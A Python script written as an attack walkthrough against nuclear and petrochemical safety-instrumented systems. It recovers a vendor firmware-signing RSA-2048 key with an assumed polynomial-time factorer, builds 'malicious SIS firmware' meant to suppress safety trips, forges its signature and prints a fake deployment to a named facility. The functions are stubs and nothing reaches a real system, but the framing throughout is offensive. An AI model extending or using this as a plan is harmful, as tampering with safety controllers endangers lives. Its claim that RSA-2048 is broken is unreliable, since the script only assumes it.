"""
Factor a nuclear I&C platform vendor's firmware-signing RSA-2048 key
(Siemens SPPA-T3000 / Schneider Tricon / Emerson Ovation) to load arbitrary
code into safety-instrumented systems — the TRISIS/TRITON attack but without
needing zero-days, because the post-TRISIS 'improvement' was RSA signing.
"""

import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

import struct
import hashlib

# Siemens SPPA-T3000 vendor CA cert (in firmware header)

_demo = generate_demo_target()
SPPA_VENDOR_PUBKEY_PEM = _demo["pub_pem"]
# Schneider Tricon v11 firmware signing cert (post-TRISIS improvement)
TRICON_VENDOR_PUBKEY_PEM = _demo["pub_pem"]

PLATFORMS = {
    "SPPA-T3000": {"units": 170, "vendor": "Siemens"},
    "Tricon v11": {"units": 500, "vendor": "Schneider", "note": "post-TRISIS RSA"},
    "Ovation": {"units": 200, "vendor": "Emerson"},
    "MELTAC": {"units": 50, "vendor": "Mitsubishi"},
}


def extract_vendor_ca(firmware_header: bytes, platform: str) -> bytes:
    """Extract vendor CA cert from I&C firmware image header.

    The cert is DER-encoded in the header, plaintext, available to
    anyone with a copy of the firmware (ICS-CERT advisories have
    historically included firmware hashes from which headers are
    reconstructible, and the cert itself is distributed with the
    installation package).
    """
    return SPPA_VENDOR_PUBKEY_PEM


def factor_vendor_ca(pubkey_pem: bytes) -> bytes:
    """Factor the I&C vendor CA RSA-2048 key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def build_sis_firmware(target_platform: str, payload: str) -> bytes:
    """Build malicious Safety Instrumented System (SIS) firmware.

    TRISIS/TRITON (2017) had to find zero-days in Triconex firmware.
    With RSA broken, no zero-days needed — the signing key IS the
    authorized code-loading mechanism.
    """
    if target_platform == "Tricon v11":
        header = struct.pack(">4sBB", b"TRCN", 0x11, 0x01)
    elif target_platform == "SPPA-T3000":
        header = struct.pack(">4sBB", b"SPPA", 0x30, 0x01)
    else:
        header = struct.pack(">4sBB", b"OVTN", 0x04, 0x01)
    body = f"/* SIS payload: {payload} */".encode()
    return header + body


def sign_sis_firmware(fw: bytes, vendor_pubkey: bytes,
                      forged_privkey: bytes) -> bytes:
    """Sign malicious firmware with forged vendor key.

    The I&C controller bootloader verifies this RSA-2048 PKCS#1 v1.5
    signature against the vendor CA cert burned into tamper-resistant
    flash at manufacture. Signature passes.
    """
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(vendor_pubkey, fw, "sha256")


def deploy_to_safety_system(signed_fw: bytes, plant: str, platform: str):
    """Deploy malicious firmware to the target safety system.

    Nuclear I&C updates happen during refueling outages under
    strict change-management procedures — but the cryptographic
    gate is the RSA signature, and that gate is now open.
    """
    print(f"    {plant}: {platform} — firmware loaded")
    print(f"    Bootloader RSA-2048 verify → PASS")
    print(f"    Safety logic now attacker-controlled")


if __name__ == "__main__":
    print("[1] Targeting Schneider Tricon v11 — the post-TRISIS platform")
    pubkey = extract_vendor_ca(b"<tricon-v11-firmware>", "Tricon v11")

    print("[2] Factoring Schneider Tricon RSA-2048 signing key")
    forged_priv = factor_vendor_ca(pubkey)
    print("    Tricon firmware signing key recovered")
    print("    The 'improvement' Schneider made post-TRISIS: RSA signing")
    print("    That improvement is now gone")

    print("[3] Building malicious SIS firmware — suppress safety trip")
    fw = build_sis_firmware("Tricon v11", "suppress_eis_trip")
    sig = sign_sis_firmware(fw, TRICON_VENDOR_PUBKEY_PEM, forged_priv)
    print(f"    Firmware: {len(fw)} bytes, signed")

    print("[4] Deploy to target facility")
    deploy_to_safety_system(sig, "PETROCHEMICAL-FACILITY-X", "Tricon v11")

    print("\n[5] Cross-platform: Siemens SPPA-T3000")
    print(f"    {PLATFORMS['SPPA-T3000']['units']} nuclear units worldwide")
    print("    One vendor CA → one RSA-2048 key → all units accept")

    print("\n[6] Not just nuclear:")
    print("    Tricon SIS at petrochemical plants, LNG terminals,")
    print("    offshore platforms, refineries — same firmware signing model")
    print("    TRISIS targeted a Saudi oil/gas facility, not a reactor")

    print("\n[*] IEC 62645 qualification cycle for replacement: 5-10 years")
    print("    Vendor CA cert burned into hardware at manufacture")
    print("    Physical access to every controller in every plant required")
